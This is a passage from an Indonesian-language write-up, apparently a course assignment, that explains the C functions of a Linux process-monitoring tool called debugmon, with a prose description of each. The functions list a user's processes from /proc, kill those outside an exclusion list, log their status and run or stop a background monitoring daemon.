3. list_user_processes
```c
void list_user_processes(const char *username) {
    DIR *proc = opendir("/proc");
    struct dirent *entry;
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        printf("User '%s' tidak ditemukan.\n", username);
        return;
    }
    uid_t target_uid = pwd->pw_uid;
    printf("PID\tCOMMAND\n");
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            long pid = strtol(entry->d_name, NULL, 10);
            if (pid <= 0) continue;
            char status_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);
            FILE *status = fopen(status_path, "r");
            if (!status) continue;
            char line[256], name[256] = "";
            uid_t uid = -1;
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "Name:", 5) == 0)
                    sscanf(line, "Name:\t%255s", name);
                else if (strncmp(line, "Uid:", 4) == 0)
                    sscanf(line, "Uid:\t%d", &uid);
            }
            fclose(status);
            if (uid == target_uid)
                printf("%ld\t%s\n", pid, name);
        }
    }
    closedir(proc);
}
```
Fungsi ini digunakan untuk menampilkan seluruh proses yang sedang dijalankan oleh seorang user tertentu. Fungsi ini menerima parameter berupa username, lalu akan mengambil UID (User ID) dari user tersebut menggunakan fungsi getpwnam. Selanjutnya, fungsi ini membuka direktori /proc yang menyimpan informasi semua proses yang sedang berjalan di sistem. Dengan membaca file /proc/<pid>/status, fungsi mengekstrak nama proses dan UID-nya, dan hanya akan menampilkan proses yang dimiliki oleh user target. Hasil akhirnya adalah daftar PID dan nama proses milik user yang dicetak ke layar.

4. fail_processes
```c
void fail_processes(const char *username) {
    DIR *proc = opendir("/proc");
    struct dirent *entry;
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        printf("User '%s' tidak ditemukan.\n", username);
        return;
    }
    uid_t target_uid = pwd->pw_uid;
    const char *excluded[] = {
        "Xorg", "X", "Xwayland", "gnome-shell", "plasmashell",
        "mutter", "kwin_x11", "kwin_wayland", "ksmserver", "kdeinit",
        "systemd", "sddm", "gdm", "lightdm", "gnome-session",
        "xdg-desktop-portal", "polkitd", "dbus-daemon",
        "bash", "zsh", "fish", "login", "agetty", "sshd",
        "konsole", "gnome-terminal", "xterm", "alacritty", "tilix",
        "debugmon", NULL
    };
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            long pid = strtol(entry->d_name, NULL, 10);
            if (pid <= 0) continue;
            char status_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);
            FILE *status = fopen(status_path, "r");
            if (!status) continue;
            char line[256], name[256] = "";
            uid_t uid = -1;
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "Name:", 5) == 0)
                    sscanf(line, "Name:\t%255s", name);
                else if (strncmp(line, "Uid:", 4) == 0)
                    sscanf(line, "Uid:\t%d", &uid);
            }
            fclose(status);
            if (uid == target_uid) {
                int skip = 0;
                for (int i = 0; excluded[i] != NULL; i++) {
                    if (strcmp(name, excluded[i]) == 0) {
                        skip = 1;
                        break;
                    }
                }
                if (!skip) {
                    kill(pid, SIGKILL);
                    write_log(name, "FAILED");
                    printf("Killed PID %ld (%s)\n", pid, name);
                }
            }
        }
    }
    closedir(proc);
}
```
Fungsi fail_processes memiliki tugas untuk menghentikan atau "membunuh" proses milik user tertentu, kecuali proses-proses yang termasuk dalam daftar pengecualian (whitelist) seperti bash, systemd, Xorg, debugmon, dll. Fungsi ini bekerja dengan membaca UID dari user target, lalu memindai direktori /proc untuk mendapatkan semua proses yang berjalan. Jika proses tersebut dimiliki oleh user target dan tidak masuk daftar pengecualian, maka proses akan dihentikan dengan sinyal SIGKILL. Setiap proses yang berhasil dihentikan akan dicatat di log menggunakan fungsi write_log dengan status FAILED, serta ditampilkan ke layar sebagai notifikasi.

5. revert_processes
```c
void revert_processes(const char *username) {
    write_log("debugmon", "RUNNING");
    printf("User %s diizinkan kembali menjalankan proses.\n", username);
}
```
Fungsi revert_processes tidak secara langsung menghidupkan kembali proses yang sebelumnya dihentikan, melainkan hanya menulis ke log bahwa user sudah "diizinkan" kembali menjalankan proses. Fungsinya bersifat simbolik, sebagai indikator bahwa monitoring atau pembatasan proses telah dihentikan. Ini bisa dianggap sebagai pengesahan manual bahwa user bisa menjalankan proses lagi. Log dicatat dengan nama proses debugmon dan status RUNNING, serta ditampilkan pesan konfirmasi ke layar.

6. daemon_monitor
```c
void daemon_monitor(const char *username) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) {
        FILE *f = fopen(PID_FILE, "w");
        if (f) {
            fprintf(f, "%d\n", pid);
            fclose(f);
        }
        exit(EXIT_SUCCESS);
    }
    setsid();
    umask(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    struct passwd *pwd = getpwnam(username);
    if (!pwd) exit(EXIT_FAILURE);
    uid_t target_uid = pwd->pw_uid;
    while (1) {
        DIR *proc = opendir("/proc");
        struct dirent *entry;
        while ((entry = readdir(proc)) != NULL) {
            if (entry->d_type == DT_DIR) {
                long pid = strtol(entry->d_name, NULL, 10);
                if (pid <= 0) continue;
                char status_path[256];
                snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);
                FILE *status = fopen(status_path, "r");
                if (!status) continue;
                char line[256], name[256] = "";
                uid_t uid = -1;
                while (fgets(line, sizeof(line), status)) {
                    if (strncmp(line, "Name:", 5) == 0)
                        sscanf(line, "Name:\t%255s", name);
                    else if (strncmp(line, "Uid:", 4) == 0)
                        sscanf(line, "Uid:\t%d", &uid);
                }
                fclose(status);
                if (uid == target_uid) {
                    write_log(name, "RUNNING");
                }
            }
        }
        closedir(proc);
        sleep(5);
    }
}
```
Fungsi ini merupakan inti dari daemon pemantau yang berjalan di background untuk memantau proses-proses milik user tertentu. Fungsi ini pertama-tama melakukan fork() untuk menciptakan proses anak (child process), kemudian melakukan daemonisasi dengan memutus hubungan dari terminal, membuat sesi baru, dan menutup input/output standar. Setelah itu, daemon akan terus berjalan dalam loop tak hingga, setiap 5 detik membuka direktori /proc, mencari semua proses milik user yang sesuai UID-nya, dan mencatat status RUNNING dari setiap proses ke dalam log. Dengan kata lain, fungsi ini secara pasif memonitor dan mencatat aktivitas proses milik user target secara berkala.

7. stop_daemon
```c
void stop_daemon() {
    FILE *f = fopen(PID_FILE, "r");
    if (!f) {
        printf("Daemon tidak berjalan.\n");
        return;
    }
    pid_t pid;
    fscanf(f, "%d", &pid);
    fclose(f);
    if (kill(pid, SIGTERM) == 0) {
        remove(PID_FILE);
        printf("Daemon dihentikan.\n");
    } else {
        perror("Gagal menghentikan daemon");
    }
}
```
Fungsi stop_daemon digunakan untuk menghentikan daemon yang sebelumnya telah dijalankan oleh daemon_monitor. Fungsi ini membaca PID (Process ID) dari file debugmon.pid yang dibuat saat daemon dimulai. Jika file ditemukan dan PID valid, maka daemon akan dihentikan dengan sinyal SIGTERM. Setelah daemon dihentikan, file PID akan dihapus sebagai tanda bahwa daemon sudah tidak aktif. Jika file PID tidak ditemukan atau proses tidak bisa dihentikan, maka akan muncul pesan kesalahan.

8. main
```c
int main(int argc, char *argv[]) {
    if (argc != 3 && !(argc == 2 && strcmp(argv[1], "stop") == 0)) {
        ...
        return 1;
    }

    const char *cmd = argv[1];
    const char *username = argc == 3 ? argv[2] : NULL;

    if (strcmp(cmd, "list") == 0) {
        list_user_processes(username);
    } else if (strcmp(cmd, "daemon") == 0) {
        daemon_monitor(username);
    } else if (strcmp(cmd, "stop") == 0) {
        stop_daemon();
    } else if (strcmp(cmd, "fail") == 0) {
        fail_processes(username);
    } else if (strcmp(cmd, "revert") == 0) {
        revert_processes(username);
    } else {
        printf("Unknown command: %s\n", cmd);
        return 1;
    }

    return 0;
}
```
Fungsi main dalam program debugmon berperan sebagai titik awal eksekusi dan pengatur alur berdasarkan perintah yang diberikan oleh pengguna melalui command line. Pertama, program memeriksa apakah argumen yang diberikan sesuai dengan format yang diharapkan. Jika tidak sesuai, maka akan ditampilkan petunjuk penggunaan program beserta daftar perintah yang valid, yaitu list, fail, revert, daemon, dan stop. Jika perintah yang dimasukkan adalah stop, maka cukup dua argumen yang diperlukan; namun untuk perintah lainnya, dibutuhkan tiga argumen: nama program, perintah, dan nama user. Setelah memverifikasi argumen, program memanggil fungsi yang sesuai dengan perintah yang diberikan. Misalnya, list akan memanggil fungsi list_user_processes, fail memanggil fail_processes, dan seterusnya. Fungsi-fungsi ini menjalankan logika masing-masing untuk memantau atau mengendalikan proses milik user tertentu di sistem. Jika perintah tidak dikenali, maka program akan mengeluarkan pesan error bahwa perintah tersebut tidak diketahui. Secara keseluruhan, fungsi main menjadi pengarah utama bagi fitur-fitur yang dimiliki oleh debugmon.
